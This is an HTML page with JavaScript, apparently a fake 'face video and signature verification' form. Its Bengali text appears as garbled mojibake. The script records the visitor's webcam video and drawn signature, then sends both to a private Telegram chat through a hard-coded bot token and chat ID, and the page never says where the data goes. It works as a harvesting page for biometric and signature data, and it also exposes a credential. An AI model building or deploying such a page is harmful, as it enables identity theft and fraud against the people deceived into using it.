<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <title>‡¶´‡ßá‡¶∏ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ì ‡¶∏‡¶ø‡¶ó‡¶®‡ßá‡¶ö‡¶æ‡¶∞ ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 20px; }
    video, canvas { width: 90%; max-width: 320px; margin-bottom: 15px; border: 1px solid #ccc; }
    .signature { border: 1px dashed #000; height: 150px; }
    button { padding: 10px 20px; margin: 5px; background: green; color: #fff; border: none; border-radius: 6px; cursor:pointer;}
    button:disabled {background:#999; cursor:not-allowed;}
    #result { margin-top: 15px; font-weight: bold; }
  </style>
</head>
<body>
  <h2>‡¶´‡ßá‡¶∏ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ì ‡¶∏‡¶ø‡¶ó‡¶®‡ßá‡¶ö‡¶æ‡¶∞ ‡¶Ø‡¶æ‡¶ö‡¶æ‡¶á</h2>

  <video id="video" autoplay muted></video>
  <br/>
  <button id="startRec">üî¥ ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶∂‡ßÅ‡¶∞‡ßÅ</button>
  <button id="stopRec" disabled>‚èπÔ∏è ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶¨‡¶®‡ßç‡¶ß</button>

  <h3>‚úçÔ∏è ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®</h3>
  <canvas id="signCanvas" class="signature" width="320" height="150"></canvas><br/>
  <button id="clearSign">üßπ ‡¶Æ‡ßÅ‡¶õ‡ßÅ‡¶®</button>
  <button id="submit" disabled>üì§ ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü</button>

  <p id="result"></p>

  <script>
    const video = document.getElementById('video');
    const signCanvas = document.getElementById('signCanvas');
    const signCtx = signCanvas.getContext('2d');
    const result = document.getElementById('result');
    const startRecBtn = document.getElementById('startRec');
    const stopRecBtn = document.getElementById('stopRec');
    const clearSignBtn = document.getElementById('clearSign');
    const submitBtn = document.getElementById('submit');

    let mediaRecorder;
    let recordedChunks = [];
    let drawing = false;
    let videoBlob = null;
    let stream = null;

    // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ
    async function startCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => {
          if (e.data.size > 0) recordedChunks.push(e.data);
        };
        mediaRecorder.onstop = () => {
          videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
          submitBtn.disabled = false;
          result.textContent = "‚úÖ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶∂‡ßá‡¶∑ ‡¶π‡ßü‡ßá‡¶õ‡ßá, ‡¶è‡¶ñ‡¶® ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§";
          stopCamera(); // ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶∂‡ßá‡¶∑ ‡¶π‡¶≤‡ßá ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡¶®‡ßç‡¶ß
        };
      } catch (err) {
        alert("‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶ö‡ßç‡¶õ‡ßá ‡¶®‡¶æ: " + err);
      }
    }

    startCamera();

    // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡¶®‡ßç‡¶ß
    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        stream = null;
      }
    }

    // ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶∂‡ßÅ‡¶∞‡ßÅ
    startRecBtn.onclick = () => {
      if (!mediaRecorder) {
        alert("‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶π‡ßü‡¶®‡¶ø!");
        return;
      }
      recordedChunks = [];
      mediaRecorder.start();
      result.textContent = "üî¥ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶°‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡ßü‡ßá‡¶õ‡ßá...";
      startRecBtn.disabled = true;
      stopRecBtn.disabled = false;
      submitBtn.disabled = true;
    };

    // ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶¨‡¶®‡ßç‡¶ß
    stopRecBtn.onclick = () => {
      if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
        result.textContent = "‚èπÔ∏è ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶°‡¶ø‡¶Ç ‡¶¨‡¶®‡ßç‡¶ß ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§";
        startRecBtn.disabled = false;
        stopRecBtn.disabled = true;
      }
    };

    // ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶Ü‡¶Å‡¶ï‡¶æ
    signCanvas.addEventListener('mousedown', () => { drawing = true; signCtx.beginPath(); });
    signCanvas.addEventListener('mouseup', () => drawing = false);
    signCanvas.addEventListener('mouseleave', () => drawing = false);
    signCanvas.addEventListener('mousemove', e => { if (drawing) drawSign(e); });
    signCanvas.addEventListener('touchstart', e => { drawing = true; signCtx.beginPath(); drawSign(e.touches[0]); });
    signCanvas.addEventListener('touchend', () => drawing = false);
    signCanvas.addEventListener('touchcancel', () => drawing = false);
    signCanvas.addEventListener('touchmove', e => { if (drawing) { drawSign(e.touches[0]); e.preventDefault(); } });

    function drawSign(e) {
      const rect = signCanvas.getBoundingClientRect();
      signCtx.lineWidth = 2;
      signCtx.strokeStyle = 'black';
      signCtx.lineTo(e.clientX - rect.left, e.clientY - rect.top);
      signCtx.stroke();
      signCtx.beginPath();
      signCtx.moveTo(e.clientX - rect.left, e.clientY - rect.top);
    }

    // ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶Æ‡ßÅ‡¶õ‡ßÅ‡¶®
    clearSignBtn.onclick = () => {
      signCtx.clearRect(0, 0, signCanvas.width, signCanvas.height);
    };

    // ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶¨‡¶æ‡¶ü‡¶®
    submitBtn.onclick = async () => {
      if (!videoBlob) return alert("‚ö†Ô∏è ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∞‡ßá‡¶ï‡¶∞‡ßç‡¶° ‡¶ï‡¶∞‡ßá‡¶®‡¶®‡¶ø!");
      if (signCanvasIsEmpty()) return alert("‚ö†Ô∏è ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶¶‡¶ø‡¶®!");

      result.textContent = "üì§ ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";

      const botToken = "7959394383:AAGeT74LkUMliX-PO5-ZtE72-rVysi_VdPc";
      const chatId = "7772426586"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶®‡ßã ‡¶π‡¶≤‡ßã

      // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (Document ‡¶π‡¶ø‡¶∏‡ßá‡¶¨‡ßá)
      const videoForm = new FormData();
      videoForm.append('chat_id', chatId);
      videoForm.append('caption', '‚úÖ ‡¶´‡ßá‡¶∏ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶®');
      videoForm.append('document', videoBlob, 'face_video.webm');

      try {
        let res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: 'POST',
          body: videoForm
        });
        if (!res.ok) throw new Error('‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•');

        // ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (Document ‡¶π‡¶ø‡¶∏‡ßá‡¶¨‡ßá)
        const signDataUrl = signCanvas.toDataURL('image/png');
        const signBlob = dataURLtoBlob(signDataUrl);
        const signForm = new FormData();
        signForm.append('chat_id', chatId);
        signForm.append('caption', 'üñäÔ∏è ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞');
        signForm.append('document', signBlob, 'signature.png');

        res = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: 'POST',
          body: signForm
        });
        if (!res.ok) throw new Error('‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•');

        result.textContent = "‚úÖ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ì ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá!";
        submitBtn.disabled = true;

      } catch (error) {
        result.textContent = "‚ùå ‡¶™‡¶æ‡¶†‡¶æ‡¶§‡ßá ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ: " + error.message;
      }
    };

    // ‡¶ö‡ßá‡¶ï ‡¶∏‡ßç‡¶¨‡¶æ‡¶ï‡ßç‡¶∑‡¶∞ ‡¶´‡¶æ‡¶Å‡¶ï‡¶æ ‡¶ï‡¶ø‡¶®‡¶æ
    function signCanvasIsEmpty() {
      const blank = document.createElement('canvas');
      blank.width = signCanvas.width;
      blank.height = signCanvas.height;
      return signCanvas.toDataURL() === blank.toDataURL();
    }

    // DataURL ‡¶•‡ßá‡¶ï‡ßá Blob ‡¶¨‡¶æ‡¶®‡¶æ‡¶®‡ßã
    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      for(let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
      return new Blob([u8arr], {type:mime});
    }
  </script>
</body>
</html>
